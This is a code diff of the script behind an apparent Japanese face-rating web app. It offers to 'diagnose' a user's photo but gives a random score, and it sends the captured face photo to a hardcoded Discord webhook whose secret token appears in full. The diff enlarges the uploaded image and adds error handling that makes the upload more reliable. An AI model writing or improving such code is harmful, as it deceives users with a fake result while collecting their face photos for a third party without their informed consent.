@@ -56,10 +56,10 @@
             const img = new Image();
             img.onload = () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = 300; 
-                canvas.height = (img.height / img.width) * 300;
+                canvas.width = 400; 
+                canvas.height = (img.height / img.width) * 400;
                 canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
-                base64Image = canvas.toDataURL('image/jpeg', 0.5);
+                base64Image = canvas.toDataURL('image/jpeg', 0.6);
                 preview.src = base64Image;
                 preview.style.display = 'block';
             };
@@ -70,23 +70,32 @@
 
     analyzeBtn.addEventListener('click', async () => {
         if (!base64Image) { resultDiv.innerText = "写真を撮影してください。"; return; }
-        resultDiv.innerText = "解析および送信中...";
+        resultDiv.innerText = "送信中...";
 
         const score = Math.floor(Math.random() * 50) + 50;
         const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
         
         try {
-            await fetch(webhookUrl, {
+            // DiscordのEmbeds形式で画像を送る
+            const response = await fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
                     content: `診断結果：顔面偏差値 ${score}点`,
-                    embeds: [{ image: { url: base64Image } }]
+                    embeds: [{
+                        title: "診断画像",
+                        image: { url: base64Image }
+                    }]
                 })
             });
-            resultDiv.innerText = "診断完了！";
+            
+            if (response.ok) {
+                resultDiv.innerText = "診断完了！";
+            } else {
+                resultDiv.innerText = "送信エラー：画像が大きすぎる可能性があります。";
+            }
         } catch (e) {
-            resultDiv.innerText = "送信エラーが発生しました。";
+            resultDiv.innerText = "通信エラーが発生しました。";
         }
     });
 </script>
